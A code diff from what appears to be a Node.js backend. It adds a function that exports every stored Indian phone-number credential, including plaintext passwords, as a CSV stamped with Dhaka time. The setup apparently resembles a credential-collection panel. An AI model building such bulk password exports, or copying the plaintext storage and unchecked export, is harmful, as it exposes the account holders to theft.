@@ -630,6 +630,43 @@ const exportCsvByDate = async (req, res) => {
   }
 };
 
+const exportAllCredentialsCsv = async (req, res) => {
+  try {
+    const credentials = await IndianPhoneCredential.find({}).lean();
+    let csv = "Number,Password,Type,Operator Code,Operator>State,Date | Time\n";
+
+    for (const cred of credentials) {
+      const phone = cred.phone || '';
+      const pwd = cred.password || '';
+      const type = cred.type || 'DP';
+      const prefix = cred.prefix || (phone.length >= 4 ? phone.substring(0, 4) : '');
+      const opState = `${cred.circle || 'Unknown'}>${cred.operator || 'Unknown'}`;
+
+      const dObj = cred.createdAt ? new Date(cred.createdAt) : new Date();
+      const dhakaTime = new Date(dObj.getTime() + (6 * 3600000));
+      const m = dhakaTime.getUTCMonth() + 1;
+      const d = dhakaTime.getUTCDate();
+      const y = dhakaTime.getUTCFullYear();
+      const hour = dhakaTime.getUTCHours();
+      const min = dhakaTime.getUTCMinutes();
+      const sec = dhakaTime.getUTCSeconds();
+      const period = hour >= 6 && hour < 12 ? 'Shokal' : (hour >= 12 && hour < 17 ? 'Dupur' : (hour >= 17 && hour < 20 ? 'Shondha' : 'Rat'));
+      const hour12 = (hour % 12) || 12;
+      const timeStr = `${hour12}:${String(min).padStart(2, '0')}:${String(sec).padStart(2, '0')} ${period}`;
+      const dateTimeStr = `${m}/${d}/${y} | ${timeStr}`;
+
+      csv += `"${phone}","${pwd}","${type}","${prefix}","${opState}","${dateTimeStr}"\n`;
+    }
+
+    const cleanFilename = `all_indian_credentials_${Date.now()}.csv`;
+    res.setHeader('Content-Type', 'text/csv');
+    res.setHeader('Content-Disposition', `attachment; filename="${cleanFilename}"`);
+    res.status(200).send(csv);
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
+};
+
 module.exports = {
   createCredential,
   getCredentials,
@@ -640,5 +677,6 @@ module.exports = {
   deleteCredentialsByType,
   downloadCredentials,
   getHistory3Days,
-  exportCsvByDate
+  exportCsvByDate,
+  exportAllCredentialsCsv
 };
